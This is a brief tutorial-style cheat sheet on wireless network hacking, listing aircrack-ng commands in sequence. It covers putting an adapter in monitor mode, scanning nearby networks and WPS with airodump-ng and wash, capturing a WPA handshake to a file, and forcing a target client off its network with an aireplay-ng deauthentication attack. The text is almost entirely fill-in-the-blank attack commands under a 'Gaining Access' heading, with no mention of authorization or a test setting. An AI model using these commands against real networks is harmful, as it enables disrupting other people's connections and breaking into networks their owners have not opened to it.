Start Wireless Network Hacking

>> Scanning

For scanning around network you need to enable monitor mode on your wireless network adapter.

  1. Airmon-ng:
    2.  To start monitor mode cmd,

    $ airmon-ng start {interface name}
    Example: airmon-ng start wlan0

    To stop monitor mode cmd,

    $ airmon-ng stop {interface name}
    Example: airmon-ng stop wlan0

• Scanning Network

  • Airodump-ng
  • To see available wireless network
    $ airodump-ng {interface}

  • wash
  • Using wash type cmd,

    $ wash -i {interface}

>> Gaining Access

• Capture Handshake

  • Capture Handshake with airodump-ng

    airodump-ng --bssid {BSSID} --channel {ch_number} --write {file_name} {interface}

• Deauthenticate Targets from network

  • Aireplay-ng
  • To Deauthenticate Target

    • $ aireplay-ng --deauth {num_pckt} -a {router_bssid} -c {target_bssid} {interface}
